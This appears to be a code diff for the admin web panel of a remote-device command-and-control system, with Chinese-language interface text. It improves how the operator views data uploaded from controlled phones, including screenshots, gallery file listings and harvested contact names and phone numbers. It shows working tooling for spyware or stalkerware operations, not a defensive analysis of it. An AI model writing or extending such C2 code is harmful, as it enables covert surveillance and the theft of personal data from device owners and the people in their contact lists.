@@ -593,44 +593,88 @@ async function loadC2Uploads(id){
   const list = data.uploads || [];
   const el = document.getElementById('c2UploadContent');
   if(!list.length){ el.innerHTML='<div style="color:#9ca3af;padding:12px">暂无上传记录，执行命令后等心跳（最多60s）刷新</div>'; return; }
-  el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">共 '+list.length+' 条，图片鉴权加载中...</div>' +
+  el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">共 '+list.length+' 条</div>' +
     list.map((u,i)=>{
-      const isImg = u.type==='screenshot' || u.type==='get_gallery' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
-      const isText = u.filename.endsWith('.txt') || u.filename.endsWith('.json');
+      // 类型分类
+      const isScreenshot = u.type==='screenshot' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+      const isGallery = u.type==='get_gallery';
+      const isContacts = u.type==='get_contacts';
+      const isText = u.filename.endsWith('.txt');
+      const isJson = u.filename.endsWith('.json') && !isGallery && !isContacts;
       const delBtn = `<button onclick="deleteUpload(${id},'${esc(u.filename)}')" style="background:#fee2e2;color:#b91c1c;border:0;border-radius:4px;padding:2px 6px;font-size:11px;cursor:pointer">删除</button>`;
-      if(isImg){
-        return `<div id="upload_${i}" style="margin-bottom:14px"><div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center;flex-wrap:wrap">${fmt(u.created_at)} ${esc(u.type)} ${u.size||0}B ${delBtn}<button onclick="openCoordPickerById('uimg_${i}')" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:4px;padding:2px 6px;font-size:11px;cursor:pointer">📍取坐标</button></div><img id="uimg_${i}" style="max-height:220px;max-width:100%;object-fit:contain;display:block;margin-top:6px;border-radius:6px;border:1px solid #e5e7eb;cursor:crosshair" title="点击打开取坐标面板"><div id="uerr_${i}" style="color:#9ca3af;font-size:12px;padding:4px">加载中...</div></div>`;
+      const hdr = `<div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:6px">${fmt(u.created_at)} <b style="color:#374151">${esc(u.type)}</b> ${fmtSize(u.size||0)} ${delBtn}</div>`;
+      if(isScreenshot){
+        return `<div id="upload_${i}" style="margin-bottom:14px;padding:10px;background:#f8fafc;border-radius:8px">${hdr}<div style="display:flex;gap:8px;margin-bottom:6px"><button onclick="openCoordPickerById('uimg_${i}')" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:4px;padding:3px 8px;font-size:11px;cursor:pointer">📍取坐标</button></div><img id="uimg_${i}" style="max-height:220px;max-width:100%;object-fit:contain;display:block;border-radius:6px;border:1px solid #e5e7eb;cursor:crosshair" title="点击打开取坐标面板"><div id="uerr_${i}" style="color:#9ca3af;font-size:12px;padding:4px">加载中...</div></div>`;
       }
-      if(isText){
-        return `<div id="upload_${i}" style="margin-bottom:10px;padding:10px;background:#f8fafc;border-radius:6px"><div style="font-size:12px;color:#6b7280;margin-bottom:4px;display:flex;gap:8px;align-items:center">${fmt(u.created_at)} ${u.type} ${u.size||0}B ${delBtn}</div><pre id="utxt_${i}" style="font-size:12px;white-space:pre-wrap;max-height:300px;overflow-y:auto;margin:0;color:#111">加载中...</pre></div>`;
+      if(isGallery){
+        return `<div id="upload_${i}" style="margin-bottom:14px;padding:10px;background:#f8fafc;border-radius:8px">${hdr}<div id="ugallery_${i}" style="color:#9ca3af;font-size:12px">加载相册列表中...</div></div>`;
       }
-      return `<div id="upload_${i}" style="margin-bottom:8px;padding:8px;background:#f8fafc;border-radius:6px"><div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center">${fmt(u.created_at)} ${u.type} ${u.size||0}B ${delBtn}</div></div>`;
+      if(isContacts){
+        return `<div id="upload_${i}" style="margin-bottom:14px;padding:10px;background:#f8fafc;border-radius:8px">${hdr}<div id="ucontacts_${i}" style="color:#9ca3af;font-size:12px">加载联系人中...</div></div>`;
+      }
+      if(isText || isJson){
+        return `<div id="upload_${i}" style="margin-bottom:10px;padding:10px;background:#f8fafc;border-radius:6px">${hdr}<pre id="utxt_${i}" style="font-size:12px;white-space:pre-wrap;max-height:300px;overflow-y:auto;margin:0;color:#111;background:#fff;padding:8px;border-radius:4px;border:1px solid #e5e7eb">加载中...</pre></div>`;
+      }
+      return `<div id="upload_${i}" style="margin-bottom:8px;padding:8px;background:#f8fafc;border-radius:6px">${hdr}</div>`;
     }).join('');
   // 异步加载各文件内容（带 Bearer token）
   list.forEach(async (u,i)=>{
-    const isImg = u.type==='screenshot'||u.type==='get_gallery'||u.filename.endsWith('.png')||u.filename.endsWith('.jpg');
-    const isText = u.filename.endsWith('.txt')||u.filename.endsWith('.json');
-    if(!isImg && !isText) return;
+    const isScreenshot = u.type==='screenshot' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+    const isGallery = u.type==='get_gallery';
+    const isContacts = u.type==='get_contacts';
+    const isText = u.filename.endsWith('.txt');
+    const isJson = u.filename.endsWith('.json') && !isGallery && !isContacts;
+    if(!isScreenshot && !isGallery && !isContacts && !isText && !isJson) return;
     try {
       const res = await fetch(`/admin/api/uploads/${u.filename}`,{headers:{'Authorization':'Bearer '+token}});
       if(!res.ok) throw new Error('HTTP '+res.status);
-      if(isImg){
+      if(isScreenshot){
         const blob = await res.blob();
         const blobUrl = URL.createObjectURL(blob);
         const img = document.getElementById('uimg_'+i);
         const err = document.getElementById('uerr_'+i);
-        if(img){ img.src = blobUrl; img.dataset.blob = blobUrl; img.onclick=()=>openCoordPicker(blobUrl,false); img.onload=()=>{ if(err) err.style.display='none'; }; }
+        if(img){ img.src=blobUrl; img.dataset.blob=blobUrl; img.onclick=()=>openCoordPicker(blobUrl,false); img.onload=()=>{ if(err) err.style.display='none'; }; }
+      } else if(isGallery){
+        const text = await res.text();
+        const el2 = document.getElementById('ugallery_'+i);
+        if(!el2) return;
+        try {
+          const arr = JSON.parse(text);
+          if(arr[0] && arr[0].error){ el2.innerHTML='<span style="color:#dc2626">错误: '+esc(arr[0].error)+'</span>'; return; }
+          el2.innerHTML = '<div style="color:#374151;font-size:12px;margin-bottom:6px">共 '+arr.length+' 张图片（仅元数据，未下载原图）</div>'+
+            '<table style="width:100%;font-size:12px;border-collapse:collapse">'+
+            '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">文件名</th><th style="padding:4px 8px;text-align:right">大小</th><th style="padding:4px 8px;text-align:right">日期</th></tr></thead>'+
+            '<tbody>'+arr.slice(0,200).map(f=>{
+              const d = f.date ? new Date(f.date*1000).toLocaleDateString('zh-CN') : '';
+              const sz = f.size>1048576 ? (f.size/1048576).toFixed(1)+'MB' : f.size>1024 ? (f.size/1024).toFixed(0)+'KB' : (f.size||0)+'B';
+              return `<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.name||'')}">${esc(f.name||'')}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${sz}</td><td style="padding:3px 8px;text-align:right;color:#6b7280">${d}</td></tr>`;
+            }).join('')+'</tbody></table>'+(arr.length>200?'<div style="color:#6b7280;font-size:11px;margin-top:4px">...仅显示前200条</div>':'');
+        } catch(pe){ el2.innerHTML='<pre style="font-size:12px;color:#111;white-space:pre-wrap">'+esc(text.slice(0,1000))+'</pre>'; }
+      } else if(isContacts){
+        const text = await res.text();
+        const el2 = document.getElementById('ucontacts_'+i);
+        if(!el2) return;
+        try {
+          const arr = JSON.parse(text);
+          if(arr[0] && arr[0].error){ el2.innerHTML='<span style="color:#dc2626">错误: '+esc(arr[0].error)+'</span>'; return; }
+          if(!arr.length){ el2.innerHTML='<span style="color:#6b7280">联系人为空（设备无联系人或权限未授予）</span>'; return; }
+          el2.innerHTML='<div style="color:#374151;font-size:12px;margin-bottom:6px">共 '+arr.length+' 条联系人</div>'+
+            '<table style="width:100%;font-size:12px;border-collapse:collapse">'+
+            '<thead><tr style="background:#e5e7eb"><th style="padding:4px 8px;text-align:left">姓名</th><th style="padding:4px 8px;text-align:left">号码</th></tr></thead>'+
+            '<tbody>'+arr.map(c=>`<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 8px;color:#111">${esc(c.name||'')}</td><td style="padding:3px 8px;color:#374151;font-family:monospace">${esc(c.phone||'')}</td></tr>`).join('')+'</tbody></table>';
+        } catch(pe){ el2.innerHTML='<pre style="font-size:12px;color:#111;white-space:pre-wrap">'+esc(text.slice(0,2000))+'</pre>'; }
       } else {
         const text = await res.text();
         const pre = document.getElementById('utxt_'+i);
         if(pre) pre.textContent = text;
       }
     } catch(e){
-      const err = document.getElementById('uerr_'+i);
+      const err = document.getElementById('uerr_'+i) || document.getElementById('ugallery_'+i) || document.getElementById('ucontacts_'+i);
       if(err) err.textContent = '加载失败: '+e.message;
     }
   });
 }
+function fmtSize(n){ if(n>1048576) return (n/1048576).toFixed(1)+'MB'; if(n>1024) return (n/1024).toFixed(0)+'KB'; return n+'B'; }
 async function deleteUpload(deviceId, filename){
   if(!confirm('删除这条记录和文件？')) return;
   const r = await api(`/admin/api/devices/${deviceId}/uploads/${encodeURIComponent(filename)}`,{method:'DELETE'});
@@ -987,7 +1031,7 @@ function renderMonitorUploads() {
       const isImg = /\.(png|jpe?g|gif|webp)$/i.test(u.filename);
       const preview = isImg
         ? `<button class="small copy" onclick="viewMonitorImage('/admin/api/uploads/${fn}')">预览</button>`
-        : `<button class="small copy" onclick="viewMonitorText('/admin/api/uploads/${fn}')">查看</button>`;
+        : `<button class="small copy" onclick="viewMonitorText('/admin/api/uploads/${fn}','${esc(u.type||'')}')">查看</button>`;
       return `<tr>
         <td>${esc(u.device_name || u.device_id)}</td>
         <td>${esc(u.type)}</td>
@@ -1026,9 +1070,30 @@ function viewMonitorImage(url) {
   document.getElementById('modalMask').classList.remove('hide');
 }
 
-async function viewMonitorText(url) {
+async function viewMonitorText(url, type) {
   const res = await fetch(url, { headers: { Authorization: 'Bearer ' + token } });
   const text = await res.text();
+  // 智能渲染：联系人 / 相册 JSON 用表格，其余用 pre
+  if (type === 'get_contacts' || type === 'get_gallery') {
+    try {
+      const arr = JSON.parse(text);
+      if (arr[0] && arr[0].error) { showModal('<div style="color:#dc2626;padding:12px">错误: '+esc(arr[0].error)+'</div>'); return; }
+      if (type === 'get_contacts') {
+        if (!arr.length) { showModal('<div style="color:#6b7280;padding:12px">联系人为空</div>'); return; }
+        const rows = arr.map(c=>`<tr><td style="padding:4px 10px">${esc(c.name||'')}</td><td style="padding:4px 10px;font-family:monospace">${esc(c.phone||'')}</td></tr>`).join('');
+        showModal(`<div style="padding:8px 0 4px;font-weight:600;color:#374151">联系人 (${arr.length}条)</div><table style="width:100%;font-size:13px;border-collapse:collapse"><thead><tr style="background:#f3f4f6"><th style="padding:4px 10px;text-align:left">姓名</th><th style="padding:4px 10px;text-align:left">号码</th></tr></thead><tbody>${rows}</tbody></table>`);
+      } else {
+        if (!arr.length) { showModal('<div style="color:#6b7280;padding:12px">相册为空</div>'); return; }
+        const rows = arr.slice(0,500).map(f=>{
+          const d = f.date ? new Date(f.date*1000).toLocaleDateString('zh-CN') : '';
+          const sz = f.size>1048576?(f.size/1048576).toFixed(1)+'MB':f.size>1024?(f.size/1024).toFixed(0)+'KB':(f.size||0)+'B';
+          return `<tr style="border-top:1px solid #f3f4f6"><td style="padding:3px 10px;max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.name||'')}">${esc(f.name||'')}</td><td style="padding:3px 10px;text-align:right">${sz}</td><td style="padding:3px 10px;text-align:right;color:#6b7280">${d}</td></tr>`;
+        }).join('');
+        showModal(`<div style="padding:8px 0 4px;font-weight:600;color:#374151">相册图片 (${arr.length}张)</div><div style="max-height:65vh;overflow-y:auto"><table style="width:100%;font-size:12px;border-collapse:collapse"><thead><tr style="background:#f3f4f6"><th style="padding:4px 10px;text-align:left">文件名</th><th style="padding:4px 10px;text-align:right">大小</th><th style="padding:4px 10px;text-align:right">日期</th></tr></thead><tbody>${rows}</tbody></table></div>`+(arr.length>500?'<div style="color:#6b7280;font-size:11px;padding:4px">仅显示前500条</div>':''));
+      }
+      return;
+    } catch(e) { /* fallthrough to raw */ }
+  }
   showModal('<pre style="white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:70vh;overflow:auto">' + esc(text) + '</pre>');
 }
 
